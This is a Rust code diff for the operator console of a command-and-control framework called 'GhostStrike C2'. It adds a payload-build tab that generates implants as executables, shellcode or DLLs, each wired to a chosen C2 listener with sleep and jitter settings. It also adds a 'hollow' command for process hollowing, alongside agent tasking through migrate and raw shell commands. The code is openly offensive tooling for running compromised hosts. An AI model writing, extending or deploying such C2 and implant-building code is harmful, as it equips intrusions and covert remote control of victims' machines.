@@ -3,12 +3,15 @@ use tokio::sync::mpsc;
 use uuid::Uuid;
 use crossterm::event::KeyEvent;
 
-use ghoststrike_common::{AgentInfo, ListenerConfig, Task, OperatorMsg, BuildConfig};
+use ghoststrike_common::{AgentInfo, ListenerConfig, Task, OperatorMsg, BuildConfig, PayloadFormat};
 
-#[derive(Debug, Clone)]
+#[derive(Debug)]
 pub enum Event {
     Key(KeyEvent),
     Server(OperatorMsg),
+    /// WebSocket connected; sender lets the app push messages to the server.
+    WsConnected(mpsc::Sender<OperatorMsg>),
+    WsDisconnected,
     Quit,
 }
 
@@ -63,7 +66,10 @@ pub struct App {
     pub connected:      bool,
     pub server_name:    String,
     pub operators:      Vec<String>,
+    pub build_log:      Vec<String>,
     event_tx:           mpsc::Sender<Event>,
+    /// Write-side of the server WebSocket; set when connection is established.
+    ws_tx: Option<mpsc::Sender<OperatorMsg>>,
 }
 
 #[derive(Debug, Default, Clone)]
@@ -97,7 +103,9 @@ impl App {
             connected:      false,
             server_name:    "GhostStrike C2".into(),
             operators:      Vec::new(),
+            build_log:      Vec::new(),
             event_tx,
+            ws_tx:          None,
         }
     }
 
@@ -120,6 +128,16 @@ impl App {
         use crossterm::event::{KeyCode, KeyModifiers};
 
         match event {
+            Event::WsConnected(tx) => {
+                self.ws_tx   = Some(tx);
+                self.connected = true;
+            }
+            Event::WsDisconnected => {
+                self.ws_tx    = None;
+                self.connected = false;
+                self.push_log("[!] Server disconnected — retrying…");
+            }
+
             Event::Server(msg) => self.handle_server_msg(msg),
 
             Event::Key(key) => {
@@ -137,6 +155,9 @@ impl App {
                         KeyCode::Tab => self.cycle_tab(false),
                         KeyCode::BackTab => self.cycle_tab(true),
                         KeyCode::Char('i') => self.input_mode = InputMode::Insert,
+                        KeyCode::Enter if self.tab == Tab::Build => {
+                            self.trigger_build().await;
+                        }
                         _ => self.handle_tab_key(key),
                     }
                 } else {
@@ -220,7 +241,25 @@ impl App {
             OperatorMsg::Error { message } => {
                 self.push_log(format!("[!] Server error: {message}"));
             }
+            OperatorMsg::BuildReady { build_id, bytes, format } => {
+                self.build_log.push(format!(
+                    "[+] Build complete: {} ({} bytes, {:?})",
+                    build_id, bytes.len(), format
+                ));
+                self.push_log(format!("[+] Payload built: build_id={build_id}"));
+            }
+            OperatorMsg::BuildError { reason } => {
+                self.build_log.push(format!("[!] Build failed: {reason}"));
+                self.push_log(format!("[!] Build failed: {reason}"));
+            }
             _ => {}
+        }
+    }
+
+    /// Send a message to the server over the WebSocket.
+    async fn send_to_server(&self, msg: OperatorMsg) {
+        if let Some(ref tx) = self.ws_tx {
+            let _ = tx.send(msg).await;
         }
     }
 
@@ -235,11 +274,75 @@ impl App {
                     _ => {}
                 }
             }
-            Tab::Listeners => {
-                // 'n' = new listener (starts input flow)
+            Tab::Build => {
+                match key.code {
+                    KeyCode::Up   => {
+                        let bc = &mut self.build_config;
+                        if bc.focused_field > 0 { bc.focused_field -= 1; }
+                    }
+                    KeyCode::Down => {
+                        let bc = &mut self.build_config;
+                        bc.focused_field = (bc.focused_field + 1).min(4);
+                    }
+                    KeyCode::Left => {
+                        let bc = &mut self.build_config;
+                        match bc.focused_field {
+                            0 => { if bc.listener_index > 0 { bc.listener_index -= 1; } }
+                            3 => { if bc.format_index > 0 { bc.format_index -= 1; } }
+                            _ => {}
+                        }
+                    }
+                    KeyCode::Right => {
+                        let bc = &mut self.build_config;
+                        let listeners_len = self.listeners.len();
+                        match bc.focused_field {
+                            0 => { if listeners_len > 0 { bc.listener_index = (bc.listener_index + 1) % listeners_len; } }
+                            3 => { bc.format_index = (bc.format_index + 1) % 3; }
+                            _ => {}
+                        }
+                    }
+                    _ => {}
+                }
             }
+            Tab::Listeners => {}
             _ => {}
         }
+    }
+
+    /// Trigger a build from the Build tab (called on Enter in Normal mode from Build tab).
+    pub async fn trigger_build(&mut self) {
+        let bc = &self.build_config;
+        let listeners: Vec<&ListenerConfig> = self.listeners.values().collect();
+        let listener = match listeners.get(bc.listener_index) {
+            Some(l) => *l,
+            None => {
+                self.build_log.push("[!] No listener selected".into());
+                return;
+            }
+        };
+        let format = match bc.format_index % 3 {
+            1 => ghoststrike_common::PayloadFormat::Shellcode,
+            2 => ghoststrike_common::PayloadFormat::Dll,
+            _ => ghoststrike_common::PayloadFormat::Exe,
+        };
+        let sleep_ms  = bc.sleep_ms.parse().unwrap_or(5000u64);
+        let jitter_pct = bc.jitter_pct.parse().unwrap_or(10u8);
+        let cfg = BuildConfig {
+            listener_id:  listener.id,
+            c2_host:      listener.host.clone(),
+            c2_port:      listener.port,
+            protocol:     listener.protocol,
+            sleep_ms,
+            jitter_pct,
+            format,
+            output_path:  Some(bc.output_path.clone()),
+            dns_domain:   listener.dns_domain.clone(),
+            pipe_name:    listener.pipe_name.clone(),
+            c2_key:       String::new(),       // server injects its pubkey
+            server_pubkey: String::new(),       // server injects before passing to builder
+        };
+        self.build_log.push(format!("[*] Build started: {} {}:{} → {}", cfg.format, cfg.c2_host, cfg.c2_port, bc.output_path));
+        self.send_to_server(OperatorMsg::BuildPayload { config: cfg }).await;
     }
 
     fn cycle_tab(&mut self, reverse: bool) {
@@ -293,7 +396,7 @@ impl App {
                         completed_at: None,
                     };
                     let msg = OperatorMsg::TaskAgent { task };
-                    let _ = self.event_tx.send(Event::Server(msg)).await;
+                    self.send_to_server(msg).await;
                     self.push_log(format!("> {input}"));
                 }
                 Err(e) => {
@@ -392,6 +495,11 @@ fn parse_command(input: &str) -> Result<ghoststrike_common::TaskCommand, String>
                 .and_then(|s| s.parse::<u32>().ok())
                 .ok_or("usage: migrate <pid>")?;
             Ok(TaskCommand::Migrate { pid })
+        }
+        "hollow" => {
+            let path = parts.into_iter().next()
+                .ok_or("usage: hollow <target_exe_path>")?;
+            Ok(TaskCommand::Hollow { target_path: path })
         }
         // Fallback: treat as a raw shell command.
         _ => Ok(TaskCommand::Shell { cmd: input.to_string() }),
